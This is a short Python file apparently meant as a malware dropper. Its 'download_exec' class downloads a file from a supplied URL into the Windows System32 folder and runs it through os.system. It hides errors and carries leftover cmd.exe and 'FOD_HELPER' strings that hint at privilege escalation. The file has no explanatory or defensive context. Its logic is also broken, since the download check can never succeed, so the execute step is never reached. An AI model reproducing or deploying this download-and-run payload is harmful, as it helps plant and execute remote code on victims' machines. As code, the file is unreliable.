from requests import get
from os import path
from os import system
from sys import exit


class download_exec(object):
    def __init__(self,url,) -> None:
        self.url = url

        try:
            if self.download_file(self.url)[1] == True:
                self.exec('C:\\Windows\\System32\\'+url.split('/')[-1])
                return None
        except Exception:
            pass


    def download_file(self,url):
        local_filename = url.split('/')[-1]

        with get(url, stream=True) as r:
            r.raise_for_status()

            with open('C:\\Windows\\System32\\'+local_filename, 'wb') as f:
                for chunk in r.iter_content(chunk_size=8192): 
                    if chunk: 
                        f.write(chunk)

        return local_filename,None


    def exec(self,filename):

        dir_file = filename
        if True == True:
            CMD            = 'exe'
            CMDX                   = r'C:\Windows\System32\cmd.exe'
            FOD_HELPER            = dir_file

            try:                
                current_dir = path.dirname(path.realpath(__file__)) + '\\' + __file__
                cmd = '{} /k {} {}'.format(CMDX, CMD, current_dir)              
                system(dir_file)                
                exit(0)                
            except:
                pass
        else:
            pass